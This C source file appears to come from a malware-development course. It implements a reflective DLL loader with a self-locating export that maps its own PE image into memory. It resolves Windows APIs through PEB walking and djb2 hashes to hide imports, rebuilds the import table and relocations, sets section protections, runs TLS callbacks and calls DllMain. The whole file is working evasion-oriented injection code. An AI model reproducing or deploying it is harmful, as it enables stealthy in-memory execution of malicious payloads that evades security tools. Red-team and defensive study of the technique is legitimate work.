#include "box.h"

// MalDev Academy
// https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/
// https://github.com/stephenfewer/ReflectiveDLLInjection/tree/178ba2a6a9feee0a9d9757dcaa65168ced588c12/inject/src
// https://0xninjacyclone.github.io/posts/exploitdev_5_winpe/
// https://trustedsec.com/blog/loading-dlls-reflections

extern void* __cdecl memcpy(void*, void*, size_t);
#pragma intrinsic(memcpy)
#pragma function(memcpy)
void* __cdecl memcpy(void* pDestination, void* pSource, size_t sLength) {

	PBYTE D = (PBYTE)pDestination;
	PBYTE S = (PBYTE)pSource;

	while (sLength--)
		*D++ = *S++;

	return pDestination;
}

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}

SIZE_T StringLengthA(IN LPCSTR String) {

	LPCSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

DWORD djb2(const char* str)
{
	DWORD hash = 5381;
	CHAR c;

	while ((c = *str++))
	{
		hash = ((hash << 5) + hash) + c;
	}

	return hash;
}

HMODULE GetModuleHandleH
(
	IN UINT32 ExportHash
)
{
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	if (!pPeb || !pLdr)
		return NULL;

	if (!ExportHash)
		return (HMODULE)pDataTableEntry->Reserved2[0];



	while (pDataTableEntry)
	{
		if (pDataTableEntry->FullDllName.Buffer && pDataTableEntry->FullDllName.Length < MAX_PATH)
		{
			CHAR Dllname[MAX_PATH] = { 0 };
			DWORD x = 0;

			while (pDataTableEntry->FullDllName.Buffer[x])
			{
				CHAR wc = pDataTableEntry->FullDllName.Buffer[x];
				if (wc >= 'A' && wc <= 'Z')
					Dllname[x] = wc - 'A' + 'a';

				else
					Dllname[x] = wc;

				x++;
			}

			Dllname[x] = '\0';

			if (djb2((PCHAR)Dllname) == ExportHash || djb2(pDataTableEntry->FullDllName.Buffer) == ExportHash)
				return (HMODULE)pDataTableEntry->Reserved2[0];
		}

		pDataTableEntry = *(PLDR_DATA_TABLE_ENTRY*)(pDataTableEntry);
	}

	return NULL;
}

PVOID GetHashAddress
(
	IN PVOID BaseAddress,
	IN ULONG64 ApiHash
)

{

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)BaseAddress;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}

	PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)BaseAddress + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	PIMAGE_EXPORT_DIRECTORY pImgExport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseAddress + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD pImgExportSize = pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	PDWORD Address = (PDWORD)((LPBYTE)BaseAddress + pImgExport->AddressOfFunctions);
	PDWORD Name = (PDWORD)((LPBYTE)BaseAddress + pImgExport->AddressOfNames);
	PWORD Ordinal = (PWORD)((LPBYTE)BaseAddress + pImgExport->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExport->NumberOfNames; i++)
	{


		CHAR* FuncName = (CHAR*)BaseAddress + Name[i];
		WORD ord = Ordinal[i];
		PVOID FuncAddr = (LPBYTE)BaseAddress + Address[ord];

		if (ApiHash == djb2(FuncName))
		{

			if ((((ULONG_PTR)FuncAddr) >= ((ULONG_PTR)pImgExport)) && (((ULONG_PTR)FuncAddr) < ((ULONG_PTR)pImgExport) + pImgExportSize))
			{

				CHAR ForwarderName[MAX_PATH] = { 0 };
				DWORD DotOffset = 0;
				PCHAR FunctionMod = NULL;
				PCHAR FunctionName = NULL;

				memcpy(ForwarderName, FuncAddr, StringLengthA((PCHAR)FuncAddr));

				for (int i = 0; i < StringLengthA((PCHAR)ForwarderName); i++)
				{

					if (((PCHAR)ForwarderName)[i] == '.')
					{
						DotOffset = i;
						ForwarderName[i] = NULL;
						break;
					}

				}

				FunctionMod = ForwarderName;
				FunctionName = ForwarderName + DotOffset + 1;

				LOADAPIHASH(fnLoadLibraryA, pLoadLibraryA, kernel32dll_HASH, LoadLibraryA_HASH);
				if (pLoadLibraryA)
					return GetHashAddress(pLoadLibraryA(FunctionMod), djb2(FunctionName));

			}
			return (FARPROC)FuncAddr;

		}

	}

	return NULL;

}

BOOL fixReloc
(
	IN DWORD RelocRVA,
	IN PVOID PeBase,
	IN DWORD_PTR dwDelta
)
{

	if (!PeBase)
		return FALSE;

	if (RelocRVA == 0)
		return TRUE;

	if (RelocRVA)
	{

		PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)PeBase + RelocRVA);

		while (Reloc->VirtualAddress)
		{
			DWORD size = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(Reloc + 1);

			for (DWORD i = 0; i < size; i++)
			{
				if (relocationRVA[i].Type == IMAGE_REL_BASED_DIR64)
				{
					ULONGLONG* ulPatchedAddress = (ULONGLONG*)((PBYTE)PeBase + Reloc->VirtualAddress + relocationRVA[i].Offset);
					*ulPatchedAddress += (ULONGLONG)dwDelta;
				}
				else if (relocationRVA[i].Type == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD* dwPatchedAddress = (DWORD*)((PBYTE)PeBase + Reloc->VirtualAddress + relocationRVA[i].Offset);
					*dwPatchedAddress += (DWORD)dwDelta;
				}
				else if (relocationRVA[i].Type == IMAGE_REL_BASED_HIGH)
				{
					WORD* wPatchedAddress = (WORD*)((PBYTE)PeBase + Reloc->VirtualAddress + relocationRVA[i].Offset);
					*wPatchedAddress += (DWORD)dwDelta;
				}
				else if (relocationRVA[i].Type == IMAGE_REL_BASED_ABSOLUTE)
				{
					break;
				}
			}
			Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);
		}
	}

	return TRUE;

}

BOOL FixIAT
(
	IN PIMAGE_DATA_DIRECTORY ImportRva,
	IN PBYTE PeBase
)
{

	PIMAGE_IMPORT_DESCRIPTOR pImport = NULL;

	for (int i = 0; i < ImportRva->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{
		pImport = (PIMAGE_IMPORT_DESCRIPTOR)(PeBase + ImportRva->VirtualAddress + i);
		if (pImport->OriginalFirstThunk == NULL && pImport->FirstThunk == NULL)
			break;

		LOADAPIHASH(fnLoadLibraryA, pLoadLibraryA, kernel32dll_HASH, LoadLibraryA_HASH);

		LPSTR lpDll = (LPSTR)((ULONGLONG)PeBase + pImport->Name);
		ULONG_PTR OriginalFirstThunkSize = pImport->OriginalFirstThunk;
		ULONG_PTR FirstThunkSize = pImport->FirstThunk;
		SIZE_T Size = 0;
		HMODULE hMod = NULL;

		if (!(hMod = pLoadLibraryA(lpDll)))
			return FALSE;

		while (TRUE)
		{

			PIMAGE_THUNK_DATA OriginalFirstThunk = (PIMAGE_THUNK_DATA)(PeBase + OriginalFirstThunkSize + Size);
			PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)(PeBase + FirstThunkSize + Size);
			PIMAGE_IMPORT_BY_NAME pImgImportName = NULL;
			ULONG_PTR FuncAddress = NULL;

			if (OriginalFirstThunk->u1.Function == NULL && FirstThunk->u1.Function == NULL)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(OriginalFirstThunk->u1.Ordinal))
			{
				PIMAGE_NT_HEADERS pImgNt = NULL;
				PIMAGE_EXPORT_DIRECTORY pImgExpDir = NULL;
				PDWORD FuncAddressArray = NULL;

				pImgNt = ((ULONG_PTR)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
				if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
					return FALSE;

				pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hMod) + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
				FuncAddressArray = (PDWORD)((ULONG_PTR)hMod + pImgExpDir->AddressOfFunctions);
				FuncAddress = ((ULONG_PTR)hMod + FuncAddressArray[OriginalFirstThunk->u1.Ordinal]);

				if (!FuncAddress)
					return FALSE;
			}
			else {
				pImgImportName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)PeBase + OriginalFirstThunk->u1.AddressOfData);
				if (!(FuncAddress = (ULONG_PTR)GetHashAddress(hMod, djb2(pImgImportName->Name))))
					return FALSE;
			}

			FirstThunk->u1.Function = (ULONGLONG)FuncAddress;
			Size += sizeof(IMAGE_THUNK_DATA);

		}

	}

	return TRUE;
}

BOOL ChangeProtection
(
	IN PVOID TargetBaseAddress,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN PIMAGE_SECTION_HEADER pImgSec
)
{
	LOADAPIHASH(PFN_VIRTUALPROTECT, pVirtualProtect, kernel32dll_HASH, VirtualProtect_HASH);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		DWORD dwProtection = 0;
		DWORD dwOldProt = 0;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_READWRITE;

		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProtection = PAGE_EXECUTE_READWRITE;
			else
				dwProtection = PAGE_EXECUTE_READ;
		}

		PVOID BaseAddress = (PVOID)((PBYTE)TargetBaseAddress + pImgSec[i].VirtualAddress);
		SIZE_T Size = pImgSec[i].SizeOfRawData;

		if (!pVirtualProtect(BaseAddress, Size, dwProtection, &dwOldProt))
		{
			return FALSE;
		}

	}

	return TRUE;

}

extern __declspec(dllexport) BOOL ReflectiveFunction()
{


	PIMAGE_DOS_HEADER pImgDos = NULL;
	PIMAGE_NT_HEADERS64 pImgNt = NULL;
	PIMAGE_DATA_DIRECTORY pImgDir = NULL;
	PBYTE PeBase = NULL;
	ULONG_PTR ReflectiveDllBase = NULL;
	PDLLMAIN pDllMain = NULL;
	DWORD dwProt = 0;

	LOADAPIHASH(PFN_VIRTUALALLOC, pVirtualAlloc, kernel32dll_HASH, VirtualAlloc_HASH);
	LOADAPIHASH(PFN_VIRTUALPROTECT, pVirtualProtect, kernel32dll_HASH, VirtualProtect_HASH);
	LOADAPIHASH(PFN_RTLADDFUNCTIONTABLE, pRtlAddFunctionTable, kernel32dll_HASH, RtlAddFunctionTable_HASH);
	LOADAPIHASH(PFN_NTFLUSHINSTRUCTIONCACHE, pNtFlushInstructionCache, ntdlldll_HASH, NtFlushInstructionCache_HASH);

	ULONG_PTR currentAddr = (ULONG_PTR)ReflectiveFunction;
	ULONG_PTR HeaderValue;

	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)currentAddr)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			HeaderValue = ((PIMAGE_DOS_HEADER)currentAddr)->e_lfanew;
			if (HeaderValue >= sizeof(IMAGE_DOS_HEADER) && HeaderValue < 1024)
			{
				HeaderValue += currentAddr;
				if (((PIMAGE_NT_HEADERS)HeaderValue)->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}
		currentAddr--;
	}

	pImgNt = (PIMAGE_NT_HEADERS64)(currentAddr + ((PIMAGE_DOS_HEADER)currentAddr)->e_lfanew);
	ReflectiveDllBase = currentAddr;

	if (!ReflectiveDllBase)
		return FALSE;

	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pImgNt);

	if ((PeBase = pVirtualAlloc(NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
	{
		return FALSE;
	}

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{
		if (pSection->SizeOfRawData == 0)
			continue;

		memcpy(
			(PVOID)(PeBase + pSection[i].VirtualAddress),
			(PVOID)(ReflectiveDllBase + pSection[i].PointerToRawData),
			pSection[i].SizeOfRawData
		);
	}

	pDllMain = (PDLLMAIN)(PeBase + pImgNt->OptionalHeader.AddressOfEntryPoint);
	DWORD_PTR dwDelta = (DWORD_PTR)PeBase - (DWORD_PTR)pImgNt->OptionalHeader.ImageBase;
	DWORD RelocRVA = pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	PIMAGE_DATA_DIRECTORY IATRva = &pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (!FixIAT(IATRva, PeBase))
	{
		return FALSE;
	}

	if (!fixReloc(RelocRVA, PeBase, dwDelta))
	{
		return FALSE;
	}

	if (!ChangeProtection(PeBase, pImgNt, pSection))
	{
		return FALSE;
	}

	PIMAGE_DATA_DIRECTORY pImgEntryException = &pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	PIMAGE_DATA_DIRECTORY pImgTLS = &pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (pImgEntryException->Size)
	{
		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(PeBase + pImgEntryException->VirtualAddress);
		if (!pRtlAddFunctionTable(pImgRuntimeEntry, (pImgEntryException->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, PeBase))
		{
		}
	}

	if (pImgTLS->Size)
	{
		PIMAGE_TLS_DIRECTORY pImgTlsDir = (PIMAGE_TLS_DIRECTORY)(PeBase + pImgTLS->VirtualAddress);
		PIMAGE_TLS_CALLBACK* pImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDir->AddressOfCallBacks);
		CONTEXT Ctx = { 0 };

		for (; *pImgTlsCallback; pImgTlsCallback++)
			(*pImgTlsCallback)((LPVOID)PeBase, DLL_PROCESS_ATTACH, &Ctx);
	}

	pNtFlushInstructionCache((HANDLE)-1, NULL, 0x00);

	pDllMain((HMODULE)PeBase, DLL_PROCESS_ATTACH, NULL);

	return TRUE;
}